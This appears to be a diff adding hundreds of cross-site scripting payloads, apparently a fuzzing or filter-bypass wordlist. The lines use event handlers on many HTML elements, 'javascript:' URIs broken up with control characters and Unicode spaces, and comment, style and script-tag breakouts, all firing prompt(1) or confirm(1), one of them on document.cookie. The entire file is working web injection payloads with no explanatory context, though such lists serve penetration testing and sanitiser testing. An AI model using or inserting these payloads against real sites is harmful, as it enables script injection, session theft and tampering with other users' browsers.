+<rp id=x tabindex=1 onbeforeactivate=prompt(1)></rp>
+<rp id=x tabindex=1 onbeforedeactivate=prompt(1)></rp><input autofocus>
+<rp id=x tabindex=1 ondeactivate=prompt(1)></rp><input id=y autofocus>
+<rp id=x tabindex=1 onfocus=prompt(1)></rp>
+<rp id=x tabindex=1 onfocusin=prompt(1)></rp>
+<rp onbeforecopy="prompt(1)" contenteditable>test</rp>
+<rp onbeforecut="prompt(1)" contenteditable>test</rp>
+<rp onbeforepaste="prompt(1)" contenteditable>test</rp>
+<rp onblur=prompt(1) tabindex=1 id=x></rp><input autofocus>
+<rp onclick="prompt(1)">test</rp>
+<rp oncontextmenu="prompt(1)">test</rp>
+<rp oncopy="prompt(1)" contenteditable>test</rp>
+<rp oncut="prompt(1)" contenteditable>test</rp>
+<rp ondblclick="prompt(1)">test</rp>
+<rp onfocusout=prompt(1) tabindex=1 id=x></rp><input autofocus>
+<rp onkeydown="prompt(1)" contenteditable>test</rp>
+<rp onkeypress="prompt(1)" contenteditable>test</rp>
+<rp onkeyup="prompt(1)" contenteditable>test</rp>
+<rp onmousedown="prompt(1)">test</rp>
+<rp onmouseenter="prompt(1)">test</rp>
+<rp onmouseleave="prompt(1)">test</rp>
+<rp onmousemove="prompt(1)">test</rp>
+<rp onmouseout="prompt(1)">test</rp>
+<rp onmouseover="prompt(1)">test</rp>
+<rp onmouseup="prompt(1)">test</rp>
+<rp onpaste="prompt(1)" contenteditable>test</rp>
+<rt draggable="true" ondrag="prompt(1)">test</rt>
+<rt draggable="true" ondragend="prompt(1)">test</rt>
+<rt draggable="true" ondragenter="prompt(1)">test</rt>
+<rt draggable="true" ondragleave="prompt(1)">test</rt>
+<rt draggable="true" ondragstart="prompt(1)">test</rt>
+<rt id=x tabindex=1 onactivate=prompt(1)></rt>
+<rt id=x tabindex=1 onbeforeactivate=prompt(1)></rt>
+<rt id=x tabindex=1 onbeforedeactivate=prompt(1)></rt><input autofocus>
+<rt id=x tabindex=1 ondeactivate=prompt(1)></rt><input id=y autofocus>
+<rt id=x tabindex=1 onfocus=prompt(1)></rt>
+<rt id=x tabindex=1 onfocusin=prompt(1)></rt>
+<rt onbeforecopy="prompt(1)" contenteditable>test</rt>
+<rt onbeforecut="prompt(1)" contenteditable>test</rt>
+<rt onbeforepaste="prompt(1)" contenteditable>test</rt>
+<rt onblur=prompt(1) tabindex=1 id=x></rt><input autofocus>
+<rt onclick="prompt(1)">test</rt>
+<rt oncontextmenu="prompt(1)">test</rt>
+<rt oncopy="prompt(1)" contenteditable>test</rt>
+<rt oncut="prompt(1)" contenteditable>test</rt>
+<rt ondblclick="prompt(1)">test</rt>
+<rt onfocusout=prompt(1) tabindex=1 id=x></rt><input autofocus>
+<rt onkeydown="prompt(1)" contenteditable>test</rt>
+<rt onkeypress="prompt(1)" contenteditable>test</rt>
+<rt onkeyup="prompt(1)" contenteditable>test</rt>
+<rt onmousedown="prompt(1)">test</rt>
+<rt onmouseenter="prompt(1)">test</rt>
+<link draggable="true" ondrag="prompt(1)">test</link>
+<link draggable="true" ondragend="prompt(1)">test</link>
+<link draggable="true" ondragenter="prompt(1)">test</link>
+<link draggable="true" ondragleave="prompt(1)">test</link>
+<link draggable="true" ondragstart="prompt(1)">test</link>
+<link href=validstyles.css rel=stylesheet onload=prompt(1)>
+<link id=x tabindex=1 onactivate=prompt(1)></link>
+<link id=x tabindex=1 onbeforeactivate=prompt(1)></link>
+<link id=x tabindex=1 onbeforedeactivate=prompt(1)></link><input autofocus>
+<link id=x tabindex=1 ondeactivate=prompt(1)></link><input id=y autofocus>
+<link onbeforecopy="prompt(1)" contenteditable>test</link>
+<link onbeforecut="prompt(1)" contenteditable>test</link>
+<link onbeforepaste="prompt(1)" contenteditable>test</link>
+<link onblur=prompt(1) tabindex=1 id=x></link><input autofocus>
+<link onclick="prompt(1)">test</link>
+<link oncontextmenu="prompt(1)">test</link>
+<link oncopy="prompt(1)" contenteditable>test</link>
+<iframe draggable="true" ondrag="prompt(1)">test</iframe>
+<iframe draggable="true" ondragend="prompt(1)">test</iframe>
+<iframe draggable="true" ondragenter="prompt(1)">test</iframe>
+<iframe draggable="true" ondragleave="prompt(1)">test</iframe>
+<iframe draggable="true" ondragstart="prompt(1)">test</iframe>
+<iframe id=x onfocus=prompt(1)>
+<iframe id=x onfocusin=prompt(1)>
+<iframe id=x tabindex=1 onactivate=prompt(1)></iframe>
+<iframe id=x tabindex=1 onbeforeactivate=prompt(1)></iframe>
+<iframe id=x tabindex=1 onbeforedeactivate=prompt(1)></iframe><input autofocus>
+<iframe id=x tabindex=1 ondeactivate=prompt(1)></iframe><input id=y autofocus>
+<iframe onbeforecopy="prompt(1)" contenteditable>test</iframe>
+<iframe onbeforecut="prompt(1)" contenteditable>test</iframe>
+<iframe onbeforepaste="prompt(1)" contenteditable>test</iframe>
+<iframe onblur=prompt(1) id=x><input autofocus>
+<iframe onclick="prompt(1)">test</iframe>
+<iframe oncontextmenu="prompt(1)">test</iframe>
+<iframe oncopy="prompt(1)" contenteditable>test</iframe>
+<iframe oncut="prompt(1)" contenteditable>test</iframe>
+<iframe ondblclick="prompt(1)">test</iframe>
+<iframe onfocusout=prompt(1) id=x><input autofocus>
+<iframe onkeydown="prompt(1)" contenteditable>test</iframe>
+<iframe onkeypress="prompt(1)" contenteditable>test</iframe>
+<iframe onkeyup="prompt(1)" contenteditable>test</iframe>
+<iframe onload=prompt(1)></iframe>
+<iframe onmousedown="prompt(1)">test</iframe>
+<iframe onmouseenter="prompt(1)">test</iframe>
+<iframe onmouseleave="prompt(1)">test</iframe>
+<iframe onmousemove="prompt(1)">test</iframe>
+<iframe onmouseout="prompt(1)">test</iframe>
+<iframe onmouseover="prompt(1)">test</iframe>
+<form draggable="true" ondragend="prompt(1)">test</form>
+<form draggable="true" ondragenter="prompt(1)">test</form>
+<form draggable="true" ondragleave="prompt(1)">test</form>
+<form draggable="true" ondragstart="prompt(1)">test</form>
+<form id=x tabindex=1 onactivate=prompt(1)></form>
+<form id=x tabindex=1 onbeforeactivate=prompt(1)></form>
+<form id=x tabindex=1 onbeforedeactivate=prompt(1)></form><input autofocus>
+<form id=x tabindex=1 ondeactivate=prompt(1)></form><input id=y autofocus>
+<form id=x tabindex=1 onfocus=prompt(1)></form>
+<form id=x tabindex=1 onfocusin=prompt(1)></form>
+<form onbeforecopy="prompt(1)" contenteditable>test</form>
+<form onbeforecut="prompt(1)" contenteditable>test</form>
+<form onbeforepaste="prompt(1)" contenteditable>test</form>
+<form onblur=prompt(1) tabindex=1 id=x></form><input autofocus>
+<form onclick="prompt(1)">test</form>
+<form oncontextmenu="prompt(1)">test</form>
+<form oncopy="prompt(1)" contenteditable>test</form>
+<form oncut="prompt(1)" contenteditable>test</form>
+<form ondblclick="prompt(1)">test</form>
+<form onfocusout=prompt(1) tabindex=1 id=x></form><input autofocus>
+<form onkeydown="prompt(1)" contenteditable>test</form>
+<form onkeypress="prompt(1)" contenteditable>test</form>
+<form onkeyup="prompt(1)" contenteditable>test</form>
+<div draggable="true" contenteditable>drag me</div><noframes ondragover=prompt(1) contenteditable>drop here</noframes>
+<div draggable="true" contenteditable>drag me</div><noframes ondrop=prompt(1) contenteditable>drop here</noframes>
+<div draggable="true" contenteditable>drag me</div><noscript ondragover=prompt(1) contenteditable>drop here</noscript>
+<div draggable="true" contenteditable>drag me</div><noscript ondrop=prompt(1) contenteditable>drop here</noscript>
+<div draggable="true" contenteditable>drag me</div><object ondragover=prompt(1) contenteditable>drop here</object>
+<div draggable="true" contenteditable>drag me</div><object ondrop=prompt(1) contenteditable>drop here</object>
+<div draggable="true" contenteditable>drag me</div><ol ondragover=prompt(1) contenteditable>drop here</ol>
+<div draggable="true" contenteditable>drag me</div><ol ondrop=prompt(1) contenteditable>drop here</ol>
+<div draggable="true" contenteditable>drag me</div><optgroup ondragover=prompt(1) contenteditable>drop here</optgroup>
+<div draggable="true" contenteditable>drag me</div><optgroup ondrop=prompt(1) contenteditable>drop here</optgroup>
+<div draggable="true" contenteditable>drag me</div><option ondragover=prompt(1) contenteditable>drop here</option>
+<div draggable="true" contenteditable>drag me</div><option ondrop=prompt(1) contenteditable>drop here</option>
+<div draggable="true" contenteditable>drag me</div><output ondragover=prompt(1) contenteditable>drop here</output>
+<div draggable="true" contenteditable>drag me</div><output ondrop=prompt(1) contenteditable>drop here</output>
+<div draggable="true" contenteditable>drag me</div><p ondragover=prompt(1) contenteditable>drop here</p>
+<div draggable="true" contenteditable>drag me</div><p ondrop=prompt(1) contenteditable>drop here</p>
+<div draggable="true" contenteditable>drag me</div><param ondragover=prompt(1) contenteditable>drop here</param>
+<div draggable="true" contenteditable>drag me</div><param ondrop=prompt(1) contenteditable>drop here</param>
+<div draggable="true" contenteditable>drag me</div><picture ondragover=prompt(1) contenteditable>drop here</picture>
+<div draggable="true" contenteditable>drag me</div><picture ondrop=prompt(1) contenteditable>drop here</picture>
+<div draggable="true" contenteditable>drag me</div><plaintext ondragover=prompt(1) contenteditable>drop here</plaintext>
+<div draggable="true" contenteditable>drag me</div><plaintext ondrop=prompt(1) contenteditable>drop here</plaintext>
+<div draggable="true" contenteditable>drag me</div><pre ondragover=prompt(1) contenteditable>drop here</pre>
+<div draggable="true" contenteditable>drag me</div><pre ondrop=prompt(1) contenteditable>drop here</pre>
+<div draggable="true" contenteditable>drag me</div><progress ondragover=prompt(1) contenteditable>drop here</progress>
+<div draggable="true" contenteditable>drag me</div><progress ondrop=prompt(1) contenteditable>drop here</progress>
+<div draggable="true" contenteditable>drag me</div><q ondragover=prompt(1) contenteditable>drop here</q>
+<div draggable="true" contenteditable>drag me</div><q ondrop=prompt(1) contenteditable>drop here</q>
+<div draggable="true" contenteditable>drag me</div><rb ondragover=prompt(1) contenteditable>drop here</rb>
+<div draggable="true" contenteditable>drag me</div><rb ondrop=prompt(1) contenteditable>drop here</rb>
+<div draggable="true" contenteditable>drag me</div><rp ondragover=prompt(1) contenteditable>drop here</rp>
+<div draggable="true" contenteditable>drag me</div><rp ondrop=prompt(1) contenteditable>drop here</rp>
+<div draggable="true" contenteditable>drag me</div><rt ondragover=prompt(1) contenteditable>drop here</rt>
+<div draggable="true" contenteditable>drag me</div><rt ondrop=prompt(1) contenteditable>drop here</rt>
+<div draggable="true" contenteditable>drag me</div><rtc ondragover=prompt(1) contenteditable>drop here</rtc>
+<div draggable="true" contenteditable>drag me</div><rtc ondrop=prompt(1) contenteditable>drop here</rtc>
+<div draggable="true" contenteditable>drag me</div><ruby ondragover=prompt(1) contenteditable>drop here</ruby>
+<div draggable="true" contenteditable>drag me</div><ruby ondrop=prompt(1) contenteditable>drop here</ruby>
+<div draggable="true" contenteditable>drag me</div><s ondragover=prompt(1) contenteditable>drop here</s>
+<div draggable="true" contenteditable>drag me</div><s ondrop=prompt(1) contenteditable>drop here</s>
+<div draggable="true" contenteditable>drag me</div><samp ondragover=prompt(1) contenteditable>drop here</samp>
+<div draggable="true" contenteditable>drag me</div><samp ondrop=prompt(1) contenteditable>drop here</samp>
+<div draggable="true" contenteditable>drag me</div><script ondragover=prompt(1) contenteditable>drop here</script>
+<div draggable="true" contenteditable>drag me</div><script ondrop=prompt(1) contenteditable>drop here</script>
+<div draggable="true" contenteditable>drag me</div><section ondragover=prompt(1) contenteditable>drop here</section>
+<div draggable="true" contenteditable>drag me</div><section ondrop=prompt(1) contenteditable>drop here</section>
+<div draggable="true" contenteditable>drag me</div><select ondragover=prompt(1) contenteditable>drop here</select>
+<div draggable="true" contenteditable>drag me</div><select ondrop=prompt(1) contenteditable>drop here</select>
+<div draggable="true" contenteditable>drag me</div><shadow ondragover=prompt(1) contenteditable>drop here</shadow>
+<div draggable="true" contenteditable>drag me</div><shadow ondrop=prompt(1) contenteditable>drop here</shadow>
+<div draggable="true" contenteditable>drag me</div><slot ondragover=prompt(1) contenteditable>drop here</slot>
+<div draggable="true" contenteditable>drag me</div><slot ondrop=prompt(1) contenteditable>drop here</slot>
+<div draggable="true" contenteditable>drag me</div><small ondragover=prompt(1) contenteditable>drop here</small>
+<div draggable="true" contenteditable>drag me</div><small ondrop=prompt(1) contenteditable>drop here</small>
+<body draggable="true" ondragstart="prompt(1)">test</body>
+<body id=x tabindex=1 onactivate=prompt(1)></body>
+<body id=x tabindex=1 onbeforeactivate=prompt(1)></body>
+<body id=x tabindex=1 onbeforedeactivate=prompt(1)></body><input autofocus>
+<body id=x tabindex=1 ondeactivate=prompt(1)></body><input id=y autofocus>
+<body id=x tabindex=1 onfocus=prompt(1)></body>
+<body id=x tabindex=1 onfocusin=prompt(1)></body>
+<body onafterprint=prompt(1)>
+<body onbeforecopy="prompt(1)" contenteditable>test</body>
+<body onbeforecut="prompt(1)" contenteditable>test</body>
+<body onbeforepaste="prompt(1)" contenteditable>test</body>
+<body onbeforeprint=prompt(1)>
+<body onbeforeunload="location='javascript:prompt(1)'">
+<body onblur=prompt(1) id=x><iframe id=x>
+<body onclick="prompt(1)">test</body>
+<body oncontextmenu="prompt(1)">test</body>
+<body oncopy="prompt(1)" contenteditable>test</body>
+<body oncut="prompt(1)" contenteditable>test</body>
+<body ondblclick="prompt(1)">test</body>
+<body onerror=prompt(1) onload=/>
+<body onfocusout=prompt(1) id=x><iframe id=x>
+<body onhashchange="prompt(1)">
+<body onkeydown="prompt(1)" contenteditable>test</body>
+<body onkeypress="prompt(1)" contenteditable>test</body>
+<body onkeyup="prompt(1)" contenteditable>test</body>
+<body onload=prompt(1)>
+<body onmessage=prompt(1)>
+<audio id=x tabindex=1 onactivate=prompt(1)></audio>
+<audio id=x tabindex=1 onbeforeactivate=prompt(1)></audio>
+<audio id=x tabindex=1 onbeforedeactivate=prompt(1)></audio><input autofocus>
+<audio id=x tabindex=1 ondeactivate=prompt(1)></audio><input id=y autofocus>
+<audio onbeforecopy="prompt(1)" contenteditable>test</audio>
+<audio onbeforecut="prompt(1)" contenteditable>test</audio>
+<audio onbeforepaste="prompt(1)" contenteditable>test</audio>
+<audio onblur=prompt(1) tabindex=1 id=x></audio><input autofocus>
+<audio oncanplay=prompt(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onclick="prompt(1)">test</audio>
+<audio oncontextmenu="prompt(1)">test</audio>
+<audio oncopy="prompt(1)" contenteditable>test</audio>
+<audio oncut="prompt(1)" contenteditable>test</audio>
+<audio ondblclick="prompt(1)">test</audio>
+<audio onfocusout=prompt(1) tabindex=1 id=x></audio><input autofocus>
+<audio onkeydown="prompt(1)" contenteditable>test</audio>
+<audio onkeypress="prompt(1)" contenteditable>test</audio>
+<audio onkeyup="prompt(1)" contenteditable>test</audio>
+<audio onloadeddata=prompt(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio onmousedown="prompt(1)">test</audio>
+<audio onmouseenter="prompt(1)">test</audio>
+<audio onmouseleave="prompt(1)">test</audio>
+<audio onmousemove="prompt(1)">test</audio>
+<audio onmouseout="prompt(1)">test</audio>
+<audio onmouseover="prompt(1)">test</audio>
+<audio onmouseup="prompt(1)">test</audio>
+<audio onpaste="prompt(1)" contenteditable>test</audio>
+<audio src/onerror=prompt(1)>
+<b draggable="true" ondrag="prompt(1)">test</b>
+<b draggable="true" ondragend="prompt(1)">test</b>
+<b draggable="true" ondragenter="prompt(1)">test</b>
+<b draggable="true" ondragleave="prompt(1)">test</b>
+<b draggable="true" ondragstart="prompt(1)">test</b>
+<b id=x tabindex=1 onactivate=prompt(1)></b>
+<b id=x tabindex=1 onbeforeactivate=prompt(1)></b>
+<b id=x tabindex=1 onbeforedeactivate=prompt(1)></b><input autofocus>
+<b id=x tabindex=1 ondeactivate=prompt(1)></b><input id=y autofocus>
+<b id=x tabindex=1 onfocus=prompt(1)></b>
+<b id=x tabindex=1 onfocusin=prompt(1)></b>
+<b onbeforecopy="prompt(1)" contenteditable>test</b>
+<b onbeforecut="prompt(1)" contenteditable>test</b>
+<b onbeforepaste="prompt(1)" contenteditable>test</b>
+<b onblur=prompt(1) tabindex=1 id=x></b><input autofocus>
+<b onclick="prompt(1)">test</b>
+<b oncontextmenu="prompt(1)">test</b>
+<b oncopy="prompt(1)" contenteditable>test</b>
+<b oncut="prompt(1)" contenteditable>test</b>
+<b ondblclick="prompt(1)">test</b>
+<b onfocusout=prompt(1) tabindex=1 id=x></b><input autofocus>
+<b onkeydown="prompt(1)" contenteditable>test</b>
+<b onkeypress="prompt(1)" contenteditable>test</b>
+<b onkeyup="prompt(1)" contenteditable>test</b>
+<b onmousedown="prompt(1)">test</b>
+<b onmouseenter="prompt(1)">test</b>
+<b onmouseleave="prompt(1)">test</b>
+<b onmousemove="prompt(1)">test</b>
+<b onmouseout="prompt(1)">test</b>
+<b onmouseover="prompt(1)">test</b>
+<b onmouseup="prompt(1)">test</b>
+<b onpaste="prompt(1)" contenteditable>test</b>
+<base draggable="true" ondrag="prompt(1)">test</base>
+<base draggable="true" ondragend="prompt(1)">test</base>
+<base draggable="true" ondragenter="prompt(1)">test</base>
+<base draggable="true" ondragleave="prompt(1)">test</base>
+<base draggable="true" ondragstart="prompt(1)">test</base>
+<base id=x tabindex=1 onactivate=prompt(1)></base>
+<base id=x tabindex=1 onbeforeactivate=prompt(1)></base>
+<base id=x tabindex=1 onbeforedeactivate=prompt(1)></base><input autofocus>
+<base id=x tabindex=1 ondeactivate=prompt(1)></base><input id=y autofocus>
+<base id=x tabindex=1 onfocus=prompt(1)></base>
+<base id=x tabindex=1 onfocusin=prompt(1)></base>
+<base onbeforecopy="prompt(1)" contenteditable>test</base>
+<base onbeforecut="prompt(1)" contenteditable>test</base>
+<base onbeforepaste="prompt(1)" contenteditable>test</base>
+<base onblur=prompt(1) tabindex=1 id=x></base><input autofocus>
+<a draggable="true" ondrag="prompt(1)">test</a>
+<a draggable="true" ondragend="prompt(1)">test</a>
+<a draggable="true" ondragenter="prompt(1)">test</a>
+<a draggable="true" ondragleave="prompt(1)">test</a>
+<a draggable="true" ondragstart="prompt(1)">test</a>
+<a id=x tabindex=1 onactivate=prompt(1)></a>
+<a id=x tabindex=1 onbeforeactivate=prompt(1)></a>
+<a id=x tabindex=1 onbeforedeactivate=prompt(1)></a><input autofocus>
+<a id=x tabindex=1 ondeactivate=prompt(1)></a><input id=y autofocus>
+<a id=x tabindex=1 onfocus=prompt(1)></a>
+<a id=x tabindex=1 onfocusin=prompt(1)></a>
+<a onbeforecopy="prompt(1)" contenteditable>test</a>
+<a onbeforecut="prompt(1)" contenteditable>test</a>
+<a onbeforepaste="prompt(1)" contenteditable>test</a>
+<a onblur=prompt(1) tabindex=1 id=x></a><input autofocus>
+<a onclick="prompt(1)">test</a>
+<a oncontextmenu="prompt(1)">test</a>
+<a oncopy="prompt(1)" contenteditable>test</a>
+<a oncut="prompt(1)" contenteditable>test</a>
+<a ondblclick="prompt(1)">test</a>
+<a onfocusout=prompt(1) tabindex=1 id=x></a><input autofocus>
+<a onkeydown="prompt(1)" contenteditable>test</a>
+<a onkeypress="prompt(1)" contenteditable>test</a>
+<a onkeyup="prompt(1)" contenteditable>test</a>
+<a onmousedown="prompt(1)">test</a>
+<a onmouseenter="prompt(1)">test</a>
+<a onmouseleave="prompt(1)">test</a>
+<script\x20type="text/javascript">javascript:confirm(1);</script>
+<script\x3Etype="text/javascript">javascript:confirm(1);</script>
+<script\x0Dtype="text/javascript">javascript:confirm(1);</script>
+<script\x09type="text/javascript">javascript:confirm(1);</script>
+<script\x0Ctype="text/javascript">javascript:confirm(1);</script>
+<script\x2Ftype="text/javascript">javascript:confirm(1);</script>
+<script\x0Atype="text/javascript">javascript:confirm(1);</script>
+'`"><\x3Cscript>javascript:confirm(1)</script>
+'`"><\x00script>javascript:confirm(1)</script>
+"'>-->*/</noscript></ti tle><script>confirm()</script>
+<svg></p><style><a id="</style><img src=1 onerror=confirm(1)>">
+<details open ontoggle="confirm()">
+\<a onmouseover="confirm(document.cookie)"\>xxs link\</a\>
+<iframe srcdoc="<svg onload=confirm(4);>">
+<img src=1 href=1 onerror="javascript:confirm(1)"></img>
+<audio src=1 href=1 onerror="javascript:confirm(1)"></audio>
+<video src=1 href=1 onerror="javascript:confirm(1)"></video>
+<body src=1 href=1 onerror="javascript:confirm(1)"></body>
+<image src=1 href=1 onerror="javascript:confirm(1)"></image>
+<object src=1 href=1 onerror="javascript:confirm(1)"></object>
+<script src=1 href=1 onerror="javascript:confirm(1)"></script>
+<svg onResize svg onResize="javascript:javascript:confirm(1)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:confirm(1)"></title
+onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:confirm(1)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:confirm(1)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:confirm(1)"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:confirm(1)"></frameset onScroll>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:confirm(1)"></script
+onReadyStateChange>
+onMouseWheel>
+<style onLoad style onLoad="javascript:javascript:confirm(1)"></style onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:confirm(1)"></iframe
+onReadyStateChange>
+<body onPageShow body onPageShow="javascript:javascript:confirm(1)"></body onPageShow>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:confirm(1)"></style
+onReadyStateChange>
+<frameset onFocus frameset onFocus="javascript:javascript:confirm(1)"></frameset onFocus>
+<applet onError applet onError="javascript:javascript:confirm(1)"></applet onError>
+<marquee onStart marquee onStart="javascript:javascript:confirm(1)"></marquee onStart>
+<script onLoad script onLoad="javascript:javascript:confirm(1)"></script onLoad>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:confirm(1)"></applet
+onreadystatechange>
+<body onpagehide body onpagehide="javascript:javascript:confirm(1)"></body onpagehide>
+<svg onunload svg onunload="javascript:javascript:confirm(1)"></svg onunload>
+<applet onerror applet onerror="javascript:javascript:confirm(1)"></applet onerror>
+<body onkeyup body onkeyup="javascript:javascript:confirm(1)"></body onkeyup>
+<body onunload body onunload="javascript:javascript:confirm(1)"></body onunload>
+<iframe onload iframe onload="javascript:javascript:confirm(1)"></iframe onload>
+<body onload body onload="javascript:javascript:confirm(1)"></body onload>
+<object onbeforeload object onbeforeload="javascript:javascript:confirm(1)"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:confirm(1)"></body
+onbeforeunload>
+<body onfocus body onfocus="javascript:javascript:confirm(1)"></body onfocus>
+<body onkeydown body onkeydown="javascript:javascript:confirm(1)"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:confirm(1)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:confirm(1)"></iframe src>
+<svg onload svg onload="javascript:javascript:confirm(1)"></svg onload>
+<body onblur body onblur="javascript:javascript:confirm(1)"></body onblur>
+\x3Cscript>javascript:confirm(1)</script>
+'"`><script>/* *\x2Fjavascript:confirm(1)// */</script>
+<script>javascript:confirm(1)</script\x0D
+<script>javascript:confirm(1)</script\x0A
+<script>javascript:confirm(1)</script\x0B
+<script charset="\x22>javascript:confirm(1)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:confirm(1)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:confirm(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:confirm(1)> -->
+--><!-- --\x21> <img src=xxx:x onerror=javascript:confirm(1)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:confirm(1)> -->
+`"'><img src='#\x27 onerror=javascript:confirm(1)>
+<a href="javascript\x3Ajavascript:confirm(1)" id="fuzzelement1">test</a>
+"'`><p><svg><script>a='hello\x27;javascript:confirm(1)//';</script></p>
+<a href="javas\x00cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x08cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x03cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<script>/* *\x2A/javascript:confirm(1)// */</script>
+<script>/* *\x00/javascript:confirm(1)// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:confirm(1)//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:confirm(1)//></style>
+<style></style\x09<img src="about:blank" onerror=javascript:confirm(1)//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:confirm(1)//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:confirm(1)//></style>
+<script>if("x\\xE1\x96\x89".length==2) { javascript:confirm(1);}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:confirm(1);}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:confirm(1);}</script>
+'`"><\x3Cscript>javascript:confirm(1)</script>
+'`"><\x00script>javascript:confirm(1)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:confirm(1)>
+"'`><\x00img src=xxx:x onerror=javascript:confirm(1)>
+<script src="data:text/plain\x2Cjavascript:confirm(1)"></script>
+<script src="data:\xD4\x8F,javascript:confirm(1)"></script>
+<script src="data:\xE0\xA4\x98,javascript:confirm(1)"></script>
+<script src="data:\xCB\x8F,javascript:confirm(1)"></script>
+<script\x20type="text/javascript">javascript:confirm(1);</script>
+<script\x3Etype="text/javascript">javascript:confirm(1);</script>
+<script\x0Dtype="text/javascript">javascript:confirm(1);</script>
+<script\x09type="text/javascript">javascript:confirm(1);</script>
+<script\x0Ctype="text/javascript">javascript:confirm(1);</script>
+<script\x2Ftype="text/javascript">javascript:confirm(1);</script>
+<script\x0Atype="text/javascript">javascript:confirm(1);</script>
+<a href="\x0Bjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:confirm(1)" id="fuzzelement1">test</a>
